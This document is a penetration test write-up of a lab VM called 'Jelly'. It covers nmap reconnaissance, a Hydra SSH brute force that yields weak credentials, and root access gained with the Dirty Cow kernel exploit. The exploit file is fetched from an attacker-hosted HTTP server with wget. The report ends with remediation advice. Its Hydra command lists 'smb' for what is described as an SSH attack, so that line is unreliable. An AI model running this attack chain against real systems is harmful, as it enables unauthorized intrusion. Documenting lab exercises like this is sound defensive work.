# Penetration Test Report - Jelly (Dirty Cow)

## Executive Summary

This report documents the penetration testing activities performed on the target machine "Jelly" (IP: 192.168.1.7). The assessment revealed critical vulnerabilities that allowed complete compromise of the system through privilege escalation.

**Target:** Jelly VM (192.168.1.7)  
**Assessment Date:** October 22, 2025  
**Severity:** Critical

## Reconnaissance Phase

### Port Scanning
Started with comprehensive port scanning to identify attack surface:

```bash
nmap 192.168.1.7 -p- --script 'ssh-auth*'
```

**Findings:**
- Only SSH port (22) open
- All other ports (65534) closed
- SSH identified as primary attack vector

### SSH Authentication Enumeration
Detailed SSH service analysis:

```bash
nmap 192.168.1.7 -p 22 --script ssh2-enum-algos
```

**Authentication Methods Found:**
- ✅ Publickey authentication
- ✅ Password authentication

## Exploitation Phase

### Brute Force Attack
Since password authentication was enabled, proceeded with credential brute-forcing:

**Tools & Resources:**
- Hydra for SSH brute force
- Common username/password lists from GitHub
- Wordlist source: `https://github.com/jeanphorn/wordlist`

**Command Executed:**
```bash
hydra -L <usernamepath> -P <passwdpath> 192.168.1.7 -s 22 smb -V
```

**Compromised Credentials:**
- **Username:** test
- **Password:** pepper

**Access Gained:** User-level shell access via SSH

## Post-Exploitation

### Initial Access
Successfully logged into the system:
```bash
ssh test@192.168.1.7
```

### System Enumeration
Conducted internal reconnaissance:
- Checked for hidden directories
- Searched for exploitable binaries
- Analyzed system kernel version

**Critical Finding:**
```bash
$ uname -a
Linux hacker 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

The kernel version was vulnerable to **Dirty Cow (CVE-2016-5195)** - a privilege escalation vulnerability.

### Privilege Escalation

**Exploit Used:** Dirty Cow (Copy-on-Write race condition)

**Procedure:**
1. Downloaded exploit code from official Dirty Cow repository
2. Set up HTTP server on attacker machine:
   ```bash
   python -m http.server
   ```
3. Transferred exploit to target:
   ```bash
   wget http://192.168.1.8:8000/cowroot.c
   ```
4. Compiled and executed exploit:
   ```bash
   gcc cowroot.c -o cowroot -pthread
   ./cowroot
   ```

**Result:** Successfully gained root privileges

## Proof of Compromise

```bash
root@hacker:/tmp# whoami
root
```

## Vulnerabilities Identified

### Critical Findings:

1. **Weak SSH Credentials**
   - Severity: High
   - Impact: Initial system access
   - Recommendation: Implement strong password policies, enable key-based authentication only

2. **Dirty Cow Kernel Vulnerability (CVE-2016-5195)**
   - Severity: Critical
   - Impact: Privilege escalation to root
   - Recommendation: Update kernel to patched version

## Attack Timeline

1. **03:11 CDT** - Initial reconnaissance with Nmap
2. **SSH Auth Analysis** - Identified password authentication vulnerability
3. **Brute Force** - Successfully cracked SSH credentials
4. **System Enumeration** - Discovered vulnerable kernel version
5. **Privilege Escalation** - Exploited Dirty Cow vulnerability
6. **Root Access Achieved** - Complete system compromise

## Recommendations

### Immediate Actions:
1. Update kernel to latest version
2. Change all user passwords, especially compromised 'test' account
3. Disable password authentication for SSH
4. Implement fail2ban or similar protection

### Long-term Security:
1. Regular vulnerability assessments
2. Kernel and system updates
3. Strong authentication policies
4. Network segmentation and access controls

## Conclusion

The Jelly VM was successfully compromised through a combination of weak SSH credentials and an unpatched kernel vulnerability. The system exhibited minimal security controls, allowing straightforward escalation from user to root privileges. Regular patching and security hardening are essential to prevent such attacks.

